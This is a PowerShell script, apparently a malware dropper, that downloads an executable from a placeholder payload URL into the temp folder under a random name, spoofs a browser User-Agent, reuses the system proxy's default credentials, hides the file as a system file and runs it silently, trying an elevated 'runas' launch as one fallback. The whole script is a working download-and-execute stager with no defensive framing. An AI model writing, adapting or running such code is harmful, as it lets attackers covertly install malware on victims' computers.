param(
    [string]$URL = "http://example.com/payload.exe",
    [string]$OutputPath = "$env:TEMP\$(Get-Random).exe"
)

function Invoke-StealthDownload {
    param (
        [string]$URL,
        [string]$OutFile
    )
    
    try {
        # Create secure WebClient with stealth settings
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $webClient.Headers.Add("Accept", "*/*")
        $webClient.Headers.Add("Accept-Language", "en-US,en;q=0.9")
        $webClient.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
        $webClient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
        
        # Download file with random name
        $webClient.DownloadFile($URL, $OutFile)
        
        # Verify download
        if (!(Test-Path $OutFile)) {
            throw "Download failed"
        }
        
        # Set file attributes to hidden and system
        $file = Get-Item $OutFile
        $file.Attributes = 'Hidden', 'System'
        
        # Execute silently using various methods
        try {
            # Try using Start-Process
            Start-Process -FilePath $OutFile -WindowStyle Hidden
        } catch {
            try {
                # Fallback to shell execute
                $shell = New-Object -ComObject Shell.Application
                $shell.ShellExecute($OutFile, "", "", "runas", 0)
            } catch {
                # Final fallback
                & $OutFile
            }
        }
        
    } catch {
        Write-Warning "Operation failed: $_"
    } finally {
        if ($webClient) {
            $webClient.Dispose()
        }
    }
}

# Execute stealthily
Invoke-StealthDownload -URL $URL -OutFile $OutputPath
